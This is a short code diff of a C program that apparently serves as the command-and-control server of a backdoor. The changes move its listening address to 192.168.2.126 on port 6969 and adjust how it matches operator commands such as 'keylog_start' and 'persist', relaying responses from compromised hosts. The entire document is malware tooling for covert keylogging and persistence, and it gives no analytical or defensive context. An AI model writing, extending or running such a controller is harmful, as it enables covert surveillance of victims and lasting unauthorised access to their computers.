@@ -25,7 +25,7 @@ int main() {
   }
   // server settings
   server.sin_family = AF_INET;
-  server.sin_addr.s_addr = inet_addr("192.168.1.111");
+  server.sin_addr.s_addr = inet_addr("192.168.2.126");
   server.sin_port = htons(6969);
   // bind settings to the pointer server
   bind(sock, (struct sockaddr *) &server, sizeof(server));
@@ -51,9 +51,9 @@ int main() {
        break;
      } else if(strncmp("cd ", buffer, 3) == 0) {
        goto jump;
-     } else if(strncmp("keylog_start ", buffer, 12) == 0) {
+     } else if(strncmp("keylog_start", buffer, 12) == 0) {
        goto jump;
-     } else if(strncmp("persist ", buffer, 7) == 0) {
+     } else if(strncmp("persist", buffer, 7) == 0) {
        recv(client_socket, response, sizeof(response), 0);
        printf("%s", response);
      } else {
